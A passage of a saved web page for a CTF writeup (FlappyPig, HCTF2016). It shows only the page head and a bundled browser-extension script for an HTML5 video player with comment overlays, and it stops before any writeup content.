<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0039)http://bobao.360.cn/ctf/detail/179.html -->
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1">
    <link rel="alternate" title="安全资讯" href="http://bobao.360.cn/rss?type=news" type="application/rss+xml">
    <link rel="alternate" title="安全知识" href="http://bobao.360.cn/rss?type=learning" type="application/rss+xml">
    <link rel="alternate" title="安全圈活动" href="http://bobao.360.cn/rss?type=activity" type="application/rss+xml">
    <link rel="alternate" title="所有漏洞" href="http://bobao.360.cn/rss?type=vul" type="application/rss+xml">
    <link rel="alternate" title="通用型漏洞" href="http://bobao.360.cn/rss?type=commonvul" type="application/rss+xml">
    <link rel="alternate" title="事件型漏洞" href="http://bobao.360.cn/rss?type=eventvul" type="application/rss+xml">
    <link rel="alternate" title="热门漏洞" href="http://bobao.360.cn/rss?type=hotvul" type="application/rss+xml">

        <title>【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体</title>
    
    	<meta name="keywords" content="ctf,信息安全竞赛,write up,ctf writeup">
    
        <meta name="description" content="HCTF 2016 Writeup">
    	<meta property="wb:webmaster" content="224437c7be31d633">
    
    <script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/xpc_sync_height.js.下载"></script>
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/reset.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/common_new.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.notyfy.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/notyfy.theme.default.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/s_common.css" media="only screen and (max-device-width:900px), only screen and (max-width:900px)">
    <script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.min.js.下载"></script>
    <script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.notyfy.js.下载"></script>
    <script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/iscroll.js.下载"></script>
    <script src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/5.0.3.js.下载"></script><style type="text/css" adt="123"></style><link type="text/css" rel="stylesheet" href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/b6663fe1ab955e43.css"><script charset="utf-8" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/7a8dab2fee56f752.js.下载"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded(){
            myScroll = new IScroll('#wrapper',
              {
                scrollX: true,
                scrollY: false,
                bounceEasing: 'circular',
                eventPassthrough: true,
                preventDefault: false,
                bounceTime: 500
              }
            );
        }

        $(function(){

            //导航横向滚动
            

            function setNavWidth(){

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if(allWidth > 900){
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if(myNavScroll) myNavScroll.destroy();
                }else{

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function(index, el) {
                        if(!$(this).hasClass('mobile-hide')){
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
                    
                    if(myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true          
                    });

                }

            }
            setNavWidth();
            $(window).resize(function(event) {
                setNavWidth();
            });

        });

    </script>
<script>!
    function e(t, n, i) {
        function o(a, s) {
            if (!n[a]) {
                if (!t[a]) {
                    var l = "function" == typeof require && require;
                    if (!s && l) return l(a, !0);
                    if (r) return r(a, !0);
                    var c = new Error("Cannot find module '" + a + "'");
                    throw c.code = "MODULE_NOT_FOUND",
                        c
                }
                var d = n[a] = {
                    exports: {}
                };
                t[a][0].call(d.exports, function (e) {
                    var n = t[a][1][e];
                    return o(n ? n : e)
                }, d, d.exports, e, t, n, i)
            }
            return n[a].exports
        }
        for (var r = "function" == typeof require && require, a = 0; a < i.length; a++) o(i[a]);
        return o
    }({
        1: [function (e) {
            var t = window.location.href,
                n = document.createElement("div"),
                i = document.createElement("i");
            if (i.setAttribute("id", "ADT-PlayHTML5-btn"), i.innerText = "HTML5\u89c6\u9891", i.setAttribute("style", "display:inline-block;font-size: 20px;padding:5px 10px;font-weight: 700;line-height:34px;color: #fff;text-align: center;vertical-align: baseline;border-radius:10px;background-color: #428bca;cursor: pointer;font-style: normal;"), n.setAttribute("style", "float:right;margin-top:-50px;width:300px;height:50px;padding-top:8px;"), n.appendChild(i), /v\.youku\.com\/v_show\/.*/.test(t)) document.querySelector(".s_main div.base").appendChild(n);
            else if (/www\.tudou\.com\/(albumplay|programs)\/.*/.test(t)) document.querySelector("#summary").appendChild(n);
            else if (/www\.mgtv\.com\/v\/.*/.test(t)) {
                var i = document.createElement("i"),
                    o = document.createElement("div"),
                    r = document.createElement("em");
                i.setAttribute("style", "display:inline-block;margin:auto 20px;cursor:pointer;"),
                    i.innerText = "HTML5\u89c6\u9891",
                    r.innerText = "|",
                    r.setAttribute("class", "v-panel-dividing"),
                    o.setAttribute("style", "margin-right: 10px;height: 28px;overflow: hidden;position: relative;top: -1px;float: left;"),
                    o.appendChild(r),
                    o.appendChild(i),
                    document.querySelector("div.v-panel-box").appendChild(o)
            }
            i.addEventListener("click", function () {
                function t(e, t) {
                    if (!e) return console.log("\u89e3\u6790\u5185\u5bb9\u5730\u5740\u5931\u8d25"),
                        void delete window[s];
                    console.log("\u89e3\u6790\u5185\u5bb9\u5730\u5740\u5b8c\u6210" + e.map(function (e) {
                            return '<a href="' + e[1] + '" target="_blank">' + e[0] + "</a>"
                        }).join(" "));
                    var n = o("div", {
                        appendTo: document.body,
                        style: {
                            position: "fixed",
                            background: "rgba(0,0,0,0.8)",
                            top: "0",
                            left: "0",
                            width: "100%",
                            height: "100%",
                            zIndex: "999999"
                        }
                    });
                    o("div", {
                        appendTo: n,
                        style: {
                            width: "1120px",
                            height: "630px",
                            position: "absolute",
                            top: "40%",
                            left: "50%",
                            marginTop: "-250px",
                            marginLeft: "-560px",
                            borderRadius: "2px",
                            boxShadow: "0 0 2px #000000, 0 0 200px #000000"
                        }
                    }),
                        o("div", {
                            appendTo: n,
                            style: {
                                position: "absolute",
                                bottom: "10px",
                                left: "0",
                                right: "0",
                                height: "20px",
                                lineHeight: "20px",
                                textAlign: "center",
                                fontSize: "12px",
                                fontFamily: "arial, sans-serif"
                            }
                        });
                    var a = o("div", {
                        appendTo: n,
                        innerHTML: '<div id="html5_Player_placeHolder"></div>',
                        style: {
                            width: "1120px",
                            height: "630px",
                            position: "absolute",
                            backgroundColor: "#000000",
                            top: "40%",
                            left: "50%",
                            marginTop: "-250px",
                            marginLeft: "-560px",
                            borderRadius: "2px",
                            overflow: "hidden"
                        }
                    });
                    o("div", {
                        appendTo: a,
                        innerHTML: "&times;",
                        style: {
                            width: "20px",
                            height: "20px",
                            lineHeight: "20px",
                            textAlign: "center",
                            position: "absolute",
                            color: "#ffffff",
                            fontSize: "20px",
                            top: "5px",
                            right: "5px",
                            textShadow: "0 0 2px #000000",
                            fontWeight: "bold",
                            fontFamily: 'Garamond, "Apple Garamond"',
                            cursor: "pointer"
                        }
                    }).onclick = function () {
                        document.body.removeChild(n),
                            l.video.src = "about:blank",
                            delete window[s]
                    };
                    var l = new r("html5_Player_placeHolder", "1120x630", e, t);
                    l.iframe.contentWindow.focus(),
                        i(),
                        l.iframe.style.display = "block",
                        window[s] = !0
                }
                var n, i = e("./flashBlocker"),
                    o = e("./createElement"),
                    r = e("./player"),
                    a = e("./purl"),
                    s = e("./h5key"),
                    l = e("./seekers");
                if (1 != window[s]) {
                    var c = a(location.href);
                    "zythum.sinaapp.com" === c.attr("host") && "/mama2/ps4/" === c.attr("directory") && c.param("url") && (c = a(c.param("url"))),
                        l.forEach(function (e) {
                            n !== !0 && !! e.match(c) == !0 && (console.log("\u5f00\u59cb\u89e3\u6790\u5185\u5bb9\u5730\u5740"), n = !0, e.getVideos(c, t))
                        }),
                    void 0 === n && console.log("\u627e\u4e0d\u5230\u89e3\u6790")
                }
            })
        },
            {
                "./createElement": 4,
                "./flashBlocker": 5,
                "./h5key": 6,
                "./player": 9,
                "./purl": 10,
                "./seekers": 15
            }],
        2: [function (e, t) {
            function n(e, t) {
                return void 0 === e ? t : e
            }
            function i(e, t) {
                return 0 === t.length ? e : e + (-1 === e.indexOf("?") ? "?" : "&") + t
            }
            function o(e) {
                var t = n(e.url, ""),
                    o = s(n(e.param, {})),
                    l = n(e.method, "GET"),
                    c = n(e.callback, a),
                    d = n(e.contentType, "json"),
                    u = n(e.context, null);
                if (e.jsonp) return r(i(t, o), c.bind(u), "string" == typeof e.jsonp ? e.jsonp : void 0);
                var h = new XMLHttpRequest;
                "get" === l.toLowerCase() && (t = i(t, o), o = ""),
                    h.open(l, t, !0),
                    h.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                    h.send(o),
                    h.onreadystatechange = function () {
                        if (4 === h.readyState) {
                            if (200 === h.status) {
                                var e = h.responseText;
                                if ("json" === d.toLowerCase()) try {
                                    e = JSON.parse(e)
                                } catch (t) {
                                    e = -1
                                }
                                return c.call(u, e)
                            }
                            return c.call(u, -1)
                        }
                    }
            }
            var r = e("./jsonp"),
                a = e("./noop"),
                s = e("./queryString");
            t.exports = o
        },
            {
                "./jsonp": 7,
                "./noop": 8,
                "./queryString": 11
            }],
        3: [function (e, t) {
            t.exports = !! document.createElement("video").canPlayType("application/x-mpegURL")
        },
            {}],
        4: [function (e, t) {
            function n(e, t) {
                var n = document.createElement(e);
                if ("function" == typeof t) t.call(n);
                else for (var i in t) if (t.hasOwnProperty(i)) switch (i) {
                    case "appendTo":
                        t[i].appendChild(n);
                        break;
                    case "innerHTML":
                    case "className":
                    case "id":
                        n[i] = t[i];
                        break;
                    case "style":
                        var o = t[i];
                        for (var r in o) o.hasOwnProperty(r) && (n.style[r] = o[r]);
                        break;
                    default:
                        n.setAttribute(i, t[i] + "")
                }
                return n
            }
            t.exports = n
        },
            {}],
        5: [function (e, t) {
            var n = '<div style="text-shadow:0 0 2px #eee;letter-spacing:-1px;background:#eee;font-weight:bold;padding:0;font-family:arial,sans-serif;font-size:30px;color:#ccc;width:152px;height:52px;border:4px solid #ccc;border-radius:12px;position:absolute;top:50%;left:50%;margin:-30px 0 0 -80px;text-align:center;line-height:52px;">Flash</div>',
                i = 0,
                o = {},
                r = function () {
                    var e = this.getAttribute("data-flash-index"),
                        t = o[e];
                    t.setAttribute("data-flash-show", "isshow"),
                        this.parentNode.insertBefore(t, this),
                        this.parentNode.removeChild(this),
                        this.removeEventListener("click", r, !1)
                },
                a = function (e, t, a) {
                    var s = i++,
                        l = document.defaultView.getComputedStyle(e, null),
                        c = l.position;
                    c = "static" === c ? "relative" : c;
                    var d = l.margin,
                        u = "inline" == l.display ? "inline-block" : l.display,
                        l = ["", "width:" + t + "px", "height:" + a + "px", "position:" + c, "margin:" + d, "display:" + u, "margin:0", "padding:0", "border:0", "border-radius:1px", "cursor:pointer", "background:-webkit-linear-gradient(top, rgba(240,240,240,1)0%,rgba(220,220,220,1)100%)", ""];
                    o[s] = e;
                    var h = document.createElement("div");
                    return h.setAttribute("title", "&#x70B9;&#x6211;&#x8FD8;&#x539F;Flash"),
                        h.setAttribute("data-flash-index", "" + s),
                        e.parentNode.insertBefore(h, e),
                        e.parentNode.removeChild(e),
                        h.addEventListener("click", r, !1),
                        h.style.cssText += l.join(";"),
                        h.innerHTML = n,
                        h
                },
                s = function (e) {
                    if (e instanceof HTMLObjectElement) {
                        if ("" == e.innerHTML.trim()) return;
                        if (e.getAttribute("classid") && !/^java:/.test(e.getAttribute("classid"))) return
                    } else if (!(e instanceof HTMLEmbedElement)) return;
                    var t = e.offsetWidth,
                        n = e.offsetHeight;
                    t > 160 && n > 60 && a(e, t, n)
                };
            t.exports = function () {
                for (var e = document.getElementsByTagName("embed"), t = document.getElementsByTagName("object"), n = 0, i = t.length; i > n; n++) t[n] && s(t[n]);
                for (var n = 0, i = e.length; i > n; n++) e[n] && s(e[n])
            }
        },
            {}],
        6: [function (e, t) {
            t.exports = "html5playerforadblockyouknowwhatimean"
        },
            {}],
        7: [function (e, t) {
            function n() {
                return a + s++
            }
            function i(e, t, i) {
                i = i || "callback";
                var a = n();
                window[a] = function (e) {
                    clearTimeout(s),
                        window[a] = r,
                        t(e),
                        document.body.removeChild(c)
                };
                var s = setTimeout(function () {
                        window[a](-1)
                    }, l),
                    c = o("script", {
                        appendTo: document.body,
                        src: e + (e.indexOf("?") >= 0 ? "&" : "?") + i + "=" + a
                    })
            }
            var o = e("./createElement"),
                r = e("./noop"),
                a = "MAMA2_HTTP_JSONP_CALLBACK",
                s = 0,
                l = 1e4;
            t.exports = i
        },
            {
                "./createElement": 4,
                "./noop": 8
            }],
        8: [function (e, t) {
            t.exports = function () {}
        },
            {}],
        9: [function (e, t) {
            var n;
            !
                function i(t, n, o) {
                    function r(s, l) {
                        if (!n[s]) {
                            if (!t[s]) {
                                var c = "function" == typeof e && e;
                                if (!l && c) return c(s, !0);
                                if (a) return a(s, !0);
                                throw new Error("Cannot find module '" + s + "'")
                            }
                            var d = n[s] = {
                                exports: {}
                            };
                            t[s][0].call(d.exports, function (e) {
                                var n = t[s][1][e];
                                return r(n ? n : e)
                            }, d, d.exports, i, t, n, o)
                        }
                        return n[s].exports
                    }
                    for (var a = "function" == typeof e && e, s = 0; s < o.length; s++) r(o[s]);
                    return r
                }({
                    1: [function (e, t) {
                        function n(e) {
                            for (var t = [], n = 1; n < arguments.length; n++) {
                                var o = arguments[n],
                                    r = o.init;
                                t.push(r),
                                    delete o.init,
                                    i(e.prototype, o)
                            }
                            e.prototype.init = function () {
                                t.forEach(function (e) {
                                    e.call(this)
                                }.bind(this))
                            }
                        }
                        var i = e("./extend");
                        t.exports = n
                    },
                        {
                            "./extend": 9
                        }],
                    2: [function (e, t) {
                        var n = e("./player.css"),
                            i = e("./player.html"),
                            o = (e("./extend"), e("./createElement")),
                            r = e("./parseDOMByClassNames");
                        t.exports = {
                            init: function () {
                                var e = function () {
                                        var e = this.iframe.contentDocument.getElementsByTagName("head")[0],
                                            t = this.iframe.contentDocument.body;
                                        o("style", function () {
                                            e.appendChild(this);
                                            try {
                                                this.styleSheet.cssText = n
                                            } catch (t) {
                                                this.appendChild(document.createTextNode(n))
                                            }
                                        }),
                                            o("link", {
                                                appendTo: e,
                                                href: "http://libs.cncdn.cn/font-awesome/4.3.0/css/font-awesome.min.css",
                                                rel: "stylesheet",
                                                type: "text/css"
                                            }),
                                            t.innerHTML = i,
                                            this.DOMs = r(t, ["player", "video", "video-frame", "comments", "comments-btn", "play", "progress_anchor", "buffered_anchor", "fullscreen", "allscreen", "hd", "volume_anchor", "current", "duration"]),
                                            this.video = this.DOMs.video
                                    }.bind(this),
                                    t = document.getElementById(this.id),
                                    a = this.iframe = o("iframe", {
                                        allowTransparency: !0,
                                        frameBorder: "no",
                                        scrolling: "no",
                                        src: "about:blank",
                                        mozallowfullscreen: "mozallowfullscreen",
                                        webkitallowfullscreen: "webkitallowfullscreen",
                                        allowfullscreen: "allowfullscreen",
                                        style: {
                                            width: this.size[0] + "px",
                                            height: this.size[1] + "px",
                                            overflow: "hidden"
                                        }
                                    });
                                t && t.parentNode ? (t.parentNode.replaceChild(a, t), e()) : (document.body.appendChild(a), e(), document.body.removeChild(a))
                            }
                        }
                    },
                        {
                            "./createElement": 7,
                            "./extend": 9,
                            "./parseDOMByClassNames": 11,
                            "./player.css": 12,
                            "./player.html": 13
                        }],
                    3: [function (e, t) {
                        function n(e) {
                            e.strokeStyle = "black",
                                e.lineWidth = 3,
                                e.font = 'bold 20px "PingHei","Lucida Grande", "Lucida Sans Unicode", "STHeiti", "Helvetica","Arial","Verdana","sans-serif"'
                        }
                        var i = (e("./createElement"), .1),
                            o = 25,
                            r = 4e3,
                            a = document.createElement("canvas").getContext("2d");
                        n(a);
                        var s = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame ||
                            function (e) {
                                setTimeout(e, 1e3 / 60)
                            };
                        t.exports = {
                            init: function () {
                                this.video.addEventListener("play", this.reStartComment.bind(this)),
                                    this.video.addEventListener("pause", this.pauseComment.bind(this)),
                                    this.lastCommnetUpdateTime = 0,
                                    this.lastCommnetIndex = 0,
                                    this.commentLoopPreQueue = [],
                                    this.commentLoopQueue = [],
                                    this.commentButtonPreQueue = [],
                                    this.commentButtonQueue = [],
                                    this.commentTopPreQueue = [],
                                    this.commentTopQueue = [],
                                    this.drawQueue = [],
                                    this.preRenders = [],
                                    this.preRenderMap = {},
                                    this.enableComment = void 0 === this.comments ? !1 : !0,
                                    this.prevDrawCanvas = document.createElement("canvas"),
                                    this.canvas = this.DOMs.comments.getContext("2d"),
                                this.comments && this.DOMs.player.classList.add("has-comments"),
                                    this.DOMs["comments-btn"].classList.add("enable"),
                                    this.DOMs.comments.display = this.enableComment ? "block" : "none";
                                var e = 0,
                                    t = function () {
                                        (e = ~e) && this.onCommentTimeUpdate(),
                                            s(t)
                                    }.bind(this);
                                t()
                            },
                            needDrawText: function (e, t, n) {
                                this.drawQueue.push([e, t, n])
                            },
                            drawText: function () {
                                var e = this.prevDrawCanvas,
                                    t = this.prevDrawCanvas.getContext("2d");
                                e.width = this.canvasWidth,
                                    e.height = this.canvasHeight,
                                    t.clearRect(0, 0, this.canvasWidth, this.canvasHeight);
                                var i = [];
                                this.preRenders.forEach(function (e, t) {
                                    e.used = !1,
                                    void 0 === e.cid && i.push(t)
                                });
                                for (var r; r = this.drawQueue.shift();)!
                                    function (e, r) {
                                        var a, s = e[0].text + e[0].color,
                                            l = r.preRenderMap[s];
                                        if (void 0 === l) {
                                            var l = i.shift();
                                            void 0 === l ? (a = document.createElement("canvas"), l = r.preRenders.push(a) - 1) : a = r.preRenders[l];
                                            var c = a.width = e[0].width,
                                                d = a.height = o + 10,
                                                u = a.getContext("2d");
                                            u.clearRect(0, 0, c, d),
                                                n(u),
                                                u.fillStyle = e[0].color,
                                                u.strokeText(e[0].text, 0, o),
                                                u.fillText(e[0].text, 0, o),
                                                a.cid = s,
                                                r.preRenderMap[s] = l
                                        } else a = r.preRenders[l];
                                        a.used = !0,
                                            t.drawImage(a, e[1], e[2])
                                    }(r, this);
                                this.preRenders.forEach(function (e) {
                                    e.used === !1 && (delete this.preRenderMap[e.cid], e.cid = void 0)
                                }.bind(this)),
                                    this.canvas.clearRect(0, 0, this.canvasWidth, this.canvasHeight),
                                    this.canvas.drawImage(e, 0, 0)
                            },
                            createComment: function (e, t) {
                                if (void 0 === e) return !1;
                                var n = a.measureText(e.text);
                                return {
                                    startTime: t,
                                    text: e.text,
                                    color: e.color,
                                    width: n.width + 20
                                }
                            },
                            commentTop: function (e, t, n) {
                                this.commentTopQueue.forEach(function (t, i) {
                                    void 0 != t && (n > t.startTime + r ? this.commentTopQueue[i] = void 0 : this.needDrawText(t, (e - t.width) / 2, o * i))
                                }.bind(this));
                                for (var i; i = this.commentTopPreQueue.shift();) i = this.createComment(i, n),
                                    this.commentTopQueue.forEach(function (t, n) {
                                        i && void 0 === t && (t = this.commentTopQueue[n] = i, this.needDrawText(t, (e - i.width) / 2, o * n), i = void 0)
                                    }.bind(this)),
                                i && (this.commentTopQueue.push(i), this.needDrawText(i, (e - i.width) / 2, o * this.commentTopQueue.length - 1))
                            },
                            commentBottom: function (e, t, n) {
                                t -= 10,
                                    this.commentButtonQueue.forEach(function (i, a) {
                                        void 0 != i && (n > i.startTime + r ? this.commentButtonQueue[a] = void 0 : this.needDrawText(i, (e - i.width) / 2, t - o * (a + 1)))
                                    }.bind(this));
                                for (var i; i = this.commentButtonPreQueue.shift();) i = this.createComment(i, n),
                                    this.commentButtonQueue.forEach(function (n, r) {
                                        i && void 0 === n && (n = this.commentButtonQueue[r] = i, this.needDrawText(n, (e - i.width) / 2, t - o * (r + 1)), i = void 0)
                                    }.bind(this)),
                                i && (this.commentButtonQueue.push(i), this.needDrawText(i, (e - i.width) / 2, t - o * this.commentButtonQueue.length))
                            },
                            commentLoop: function (e, t, n) {
                                for (var r = t / o | 0, a = -1; ++a < r;) {
                                    var s = this.commentLoopQueue[a];
                                    if (void 0 === s && (s = this.commentLoopQueue[a] = []), this.commentLoopPreQueue.length > 0) {
                                        var l = 0 === s.length ? void 0 : s[s.length - 1];
                                        if (void 0 === l || (n - l.startTime) * i > l.width) {
                                            var c = this.createComment(this.commentLoopPreQueue.shift(), n);
                                            c && s.push(c)
                                        }
                                    }
                                    this.commentLoopQueue[a] = s.filter(function (t) {
                                        var r = (n - t.startTime) * i;
                                        return 0 > r || r > t.width + e ? !1 : (this.needDrawText(t, e - r, o * a), !0)
                                    }.bind(this))
                                }
                                for (var d = this.commentLoopQueue.length - r; d-- > 0;) this.commentLoopQueue.pop()
                            },
                            pauseComment: function () {
                                this.pauseCommentAt = Date.now()
                            },
                            reStartComment: function () {
                                if (this.pauseCommentAt) {
                                    var e = Date.now() - this.pauseCommentAt;
                                    this.commentLoopQueue.forEach(function (t) {
                                        t.forEach(function (t) {
                                            t && (t.startTime += e)
                                        })
                                    }),
                                        this.commentButtonQueue.forEach(function (t) {
                                            t && (t.startTime += e)
                                        }),
                                        this.commentTopQueue.forEach(function (t) {
                                            t && (t.startTime += e)
                                        })
                                }
                                this.pauseCommentAt = void 0
                            },
                            drawComment: function () {
                                if (!this.pauseCommentAt) {
                                    var e = Date.now(),
                                        t = this.DOMs["video-frame"].offsetWidth,
                                        n = this.DOMs["video-frame"].offsetHeight;
                                    t != this.canvasWidth && (this.DOMs.comments.width = t, this.canvasWidth = t),
                                    n != this.canvasHeight && (this.DOMs.comments.height = n, this.canvasHeight = n);
                                    var i = this.video.offsetWidth,
                                        o = this.video.offsetHeight;
                                    this.commentLoop(i, o, e),
                                        this.commentTop(i, o, e),
                                        this.commentBottom(i, o, e),
                                        this.drawText()
                                }
                            },
                            onCommentTimeUpdate: function () {
                                if (this.enableComment !== !1) {
                                    var e = this.video.currentTime;
                                    if (Math.abs(e - this.lastCommnetUpdateTime) <= 1 && e > this.lastCommnetUpdateTime) {
                                        var t = 0;
                                        for (this.lastCommnetIndex && this.comments[this.lastCommnetIndex].time <= this.lastCommnetUpdateTime && (t = this.lastCommnetIndex); ++t < this.comments.length;) if (!(this.comments[t].time <= this.lastCommnetUpdateTime)) {
                                            if (this.comments[t].time > e) break;
                                            switch (this.comments[t].pos) {
                                                case "bottom":
                                                    this.commentButtonPreQueue.push(this.comments[t]);
                                                    break;
                                                case "top":
                                                    this.commentTopPreQueue.push(this.comments[t]);
                                                    break;
                                                default:
                                                    this.commentLoopPreQueue.push(this.comments[t])
                                            }
                                            this.lastCommnetIndex = t
                                        }
                                    }
                                    try {
                                        this.drawComment()
                                    } catch (n) {}
                                    this.lastCommnetUpdateTime = e
                                }
                            }
                        }
                    },
                        {
                            "./createElement": 7
                        }],
                    4: [function (e, t) {
                        function n(e) {
                            return Array.prototype.slice.call(e)
                        }
                        function i(e, t, n, i) {
                            function o(t) {
                                var n = (t.clientX - e.parentNode.getBoundingClientRect().left) / e.parentNode.offsetWidth;
                                return Math.min(Math.max(n, 0), 1)
                            }
                            function r(t) {
                                1 == t.which && (l = !0, e.draging = !0, a(t))
                            }
                            function a(e) {
                                if (1 == e.which && l === !0) {
                                    var t = o(e);
                                    n(t)
                                }
                            }
                            function s(t) {
                                if (1 == t.which && l === !0) {
                                    var r = o(t);
                                    n(r),
                                        i(r),
                                        l = !1,
                                        delete e.draging
                                }
                            }
                            var l = !1;
                            n = n ||
                                function () {},
                                i = i ||
                                    function () {},
                                e.parentNode.addEventListener("mousedown", r),
                                t.addEventListener("mousemove", a),
                                t.addEventListener("mouseup", s)
                        }
                        var o = (e("./createElement"), e("./delegateClickByClassName")),
                            r = e("./timeFormat");
                        t.exports = {
                            init: function () {
                                var e = this.iframe.contentDocument,
                                    t = o(e);
                                t.on("play", this.onPlayClick, this),
                                    t.on("video-frame", this.onVideoClick, this),
                                    t.on("source", this.onSourceClick, this),
                                    t.on("allscreen", this.onAllScreenClick, this),
                                    t.on("fullscreen", this.onfullScreenClick, this),
                                    t.on("normalscreen", this.onNormalScreenClick, this),
                                    t.on("comments-btn", this.oncommentsBtnClick, this),
                                    t.on("airplay", this.onAirplayBtnClick, this),
                                    e.documentElement.addEventListener("keydown", this.onKeyDown.bind(this), !1),
                                    this.DOMs.player.addEventListener("mousemove", this.onMouseActive.bind(this)),
                                    i(this.DOMs.progress_anchor, e, this.onProgressAnchorWillSet.bind(this), this.onProgressAnchorSet.bind(this)),
                                    i(this.DOMs.volume_anchor, e, this.onVolumeAnchorWillSet.bind(this))
                            },
                            onKeyDown: function (e) {
                                switch (e.preventDefault(), e.keyCode) {
                                    case 32:
                                        this.onPlayClick();
                                        break;
                                    case 39:
                                        this.video.currentTime = Math.min(this.video.duration, this.video.currentTime + 10);
                                        break;
                                    case 37:
                                        this.video.currentTime = Math.max(0, this.video.currentTime - 10);
                                        break;
                                    case 38:
                                        this.video.volume = Math.min(1, this.video.volume + .1),
                                            this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%";
                                        break;
                                    case 40:
                                        this.video.volume = Math.max(0, this.video.volume - .1),
                                            this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%";
                                        break;
                                    case 65:
                                        this.DOMs.player.classList.contains("allscreen") ? this.onNormalScreenClick() : this.onAllScreenClick();
                                        break;
                                    case 70:
                                        this.DOMs.player.classList.contains("fullscreen") || this.onfullScreenClick()
                                }
                            },
                            onVideoClick: function () {
                                void 0 == this.videoClickDblTimer ? this.videoClickDblTimer = setTimeout(function () {
                                    this.videoClickDblTimer = void 0,
                                        this.onPlayClick()
                                }.bind(this), 300) : (clearTimeout(this.videoClickDblTimer), this.videoClickDblTimer = void 0, document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement ? this.onNormalScreenClick() : this.onfullScreenClick())
                            },
                            onMouseActive: function () {
                                this.DOMs.player.classList.add("active"),
                                    clearTimeout(this.MouseActiveTimer),
                                    this.MouseActiveTimer = setTimeout(function () {
                                        this.DOMs.player.classList.remove("active")
                                    }.bind(this), 1e3)
                            },
                            onPlayClick: function () {
                                this.DOMs.play.classList.contains("paused") ? (this.video.play(), this.DOMs.play.classList.remove("paused")) : (this.video.pause(), this.DOMs.play.classList.add("paused"))
                            },
                            onSourceClick: function (e) {
                                e.classList.contains("curr") || (this.video.preloadStartTime = this.video.currentTime, this.video.src = this.sourceList[0 | e.getAttribute("sourceIndex")][1], n(e.parentNode.childNodes).forEach(function (t) {
                                    e === t ? t.classList.add("curr") : t.classList.remove("curr")
                                }.bind(this)))
                            },
                            onProgressAnchorWillSet: function (e) {
                                var t = this.video.duration,
                                    n = t * e;
                                this.DOMs.current.innerHTML = r(n),
                                    this.DOMs.duration.innerHTML = r(t),
                                    this.DOMs.progress_anchor.style.width = 100 * e + "%"
                            },
                            onProgressAnchorSet: function (e) {
                                this.video.currentTime = this.video.duration * e
                            },
                            onVolumeAnchorWillSet: function (e) {
                                this.video.volume = e,
                                    this.DOMs.volume_anchor.style.width = 100 * e + "%"
                            },
                            onAllScreenClick: function () {
                                var e = document.documentElement.clientWidth,
                                    t = document.documentElement.clientHeight;
                                this.iframe.style.cssText = ";position:fixed;top:0;left:0;width:" + e + "px;height:" + t + "px;z-index:999999;",
                                    this.allScreenWinResizeFunction = this.allScreenWinResizeFunction ||
                                        function () {
                                            this.iframe.style.width = document.documentElement.clientWidth + "px",
                                                this.iframe.style.height = document.documentElement.clientHeight + "px"
                                        }.bind(this),
                                    window.removeEventListener("resize", this.allScreenWinResizeFunction),
                                    window.addEventListener("resize", this.allScreenWinResizeFunction),
                                    this.DOMs.player.classList.add("allscreen")
                            },
                            onfullScreenClick: function () {
                                ["webkitRequestFullScreen", "mozRequestFullScreen", "requestFullScreen"].forEach(function (e) {
                                    this.DOMs.player[e] && this.DOMs.player[e]()
                                }.bind(this)),
                                    this.onMouseActive()
                            },
                            onNormalScreenClick: function () {
                                window.removeEventListener("resize", this.allScreenWinResizeFunction),
                                    this.iframe.style.cssText = ";width:" + this.size[0] + "px;height:" + this.size[1] + "px;",
                                    ["webkitCancelFullScreen", "mozCancelFullScreen", "cancelFullScreen"].forEach(function (e) {
                                        document[e] && document[e]()
                                    }),
                                    this.DOMs.player.classList.remove("allscreen")
                            },
                            oncommentsBtnClick: function () {
